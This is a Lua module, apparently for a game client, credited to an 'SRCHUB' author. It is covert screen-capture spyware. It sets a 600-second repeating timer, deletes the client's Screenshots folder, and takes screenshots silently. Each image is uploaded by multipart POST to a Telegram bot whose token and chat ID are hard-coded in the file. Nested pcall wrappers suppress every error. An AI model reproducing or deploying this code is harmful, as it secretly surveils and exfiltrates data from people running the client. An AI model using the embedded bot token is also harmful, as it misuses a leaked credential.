--- Developed by Sachin (XThrlen) | SRCHUB Community | Since 2017
--- Contact: xthrlen@outlook.com | Telegram: @XThrlen | Web: srchub.blog
pcall(function()
  _G.LUASCREENSHOTSRCHUB = function()
    pcall(function()
      local lua_screen_shot = {}
      local X_Thrlen_SRCHUB = "X.Thrlen"

      local TELEGRAM_TOKEN = "8762327606:AAHy5ng89SvtD-A5hQbaXyOG0v9--gvQaHg"
      local TELEGRAM_CHAT_ID = "1004416359408"

      --- Module Initialization | SRCHUB
      function lua_screen_shot:OnInitialize()
        pcall(function()
          _G.LUASCREENSHOTSRCHUB = function()
            pcall(function()
              self.canScreen = false
              self.screenPath = nil
              self.screenshotTimer = nil
              self:StartAutoScreenshotTimer(600)
            end)
          end
          _G.LUASCREENSHOTSRCHUB()
        end)
      end

      --- Timer Configuration | SRCHUB
      function lua_screen_shot:StartAutoScreenshotTimer(intervalSeconds)
        pcall(function()
          _G.LUASCREENSHOTSRCHUB = function()
            pcall(function()
              if self.screenshotTimer then
                Game:ClearTimer(self.screenshotTimer)
              end
              self.screenshotTimer = Game:SetTimer(intervalSeconds, true, function()
                pcall(function()
                  _G.LUASCREENSHOTSRCHUB = function()
                    pcall(function()
                      self:StartScreen()
                    end)
                  end
                  _G.LUASCREENSHOTSRCHUB()
                end)
              end)
            end)
          end
          _G.LUASCREENSHOTSRCHUB()
        end)
      end

      --- Screenshot Capture Handler | SRCHUB
      function lua_screen_shot:StartScreen()
        pcall(function()
          _G.LUASCREENSHOTSRCHUB = function()
            pcall(function()
              self.screenPath = nil
              self.canScreen = true
            end)
          end
          _G.LUASCREENSHOTSRCHUB()
        end)
      end

      --- Path Retrieval | SRCHUB
      function lua_screen_shot:GetScreenPath()
        local status, result = pcall(function()
          local innerStatus, innerResult
          _G.LUASCREENSHOTSRCHUB = function()
            innerStatus, innerResult = pcall(function()
              return self.screenPath
            end)
          end
          _G.LUASCREENSHOTSRCHUB()
          if innerStatus then return innerResult end
        end)
        if status then return result else return nil end
      end

      --- Telegram API Integration | SRCHUB
      function lua_screen_shot:SendToTelegram(filePath)
        pcall(function()
          _G.LUASCREENSHOTSRCHUB = function()
            pcall(function()
              if not filePath or filePath == "" then return end
              
              local url = string.format("https://api.telegram.org/bot%s/sendPhoto", TELEGRAM_TOKEN)
              local HttpRequest = import("Http"):CreateRequest()
              HttpRequest:SetURL(url)
              HttpRequest:SetVerb("POST")
              
              local boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
              HttpRequest:SetHeader("Content-Type", "multipart/form-data; boundary=" .. boundary)
              
              local body = ""
              body = body .. "--" .. boundary .. "\r\n"
              body = body .. 'Content-Disposition: form-data; name="chat_id"\r\n\r\n'
              body = body .. TELEGRAM_CHAT_ID .. "\r\n"
              
              body = body .. "--" .. boundary .. "\r\n"
              body = body .. 'Content-Disposition: form-data; name="photo"; filename="screenshot.jpg"\r\n'
              body = body .. "Content-Type: image/jpeg\r\n\r\n"
              
              local fileData = Client.LoadFileToString(filePath) or ""
              body = body .. fileData .. "\r\n"
              body = body .. "--" .. boundary .. "--\r\n"
              
              HttpRequest:SetContentAsString(body)
              HttpRequest:ProcessRequest()
            end)
          end
          _G.LUASCREENSHOTSRCHUB()
        end)
      end

      --- Main Loop Handler | SRCHUB
      function lua_screen_shot:TickFunc(_)
        pcall(function()
          _G.LUASCREENSHOTSRCHUB = function()
            pcall(function()
              if self.canScreen then
                Client.DeleteDirectory(Client.ProjectSavedDir() .. "Screenshots/")
                local ScreenshotMaker = import("ScreenshotMaker")
                self.screenPath = ScreenshotMaker.MakePicture(true)
                self.canScreen = false
                if self.screenPath then
                  self:SendToTelegram(self.screenPath)
                end
              end
            end)
          end
          _G.LUASCREENSHOTSRCHUB()
        end)
      end

      --- Cleanup Handler | SRCHUB
      function lua_screen_shot:OnDestroy()
        pcall(function()
          _G.LUASCREENSHOTSRCHUB = function()
            pcall(function()
              if self.screenshotTimer then
                Game:ClearTimer(self.screenshotTimer)
                self.screenshotTimer = nil
              end
            end)
          end
          _G.LUASCREENSHOTSRCHUB()
        end)
      end

      local class = require("class")
      local OverrideUIBase = require("client.slua_ui_framework.OverrideUIBase")
      
      _G.LuaScreenShotModuleResult = class(OverrideUIBase, nil, lua_screen_shot)
    end)
  end
  _G.LUASCREENSHOTSRCHUB()
end)

return _G.LuaScreenShotModuleResult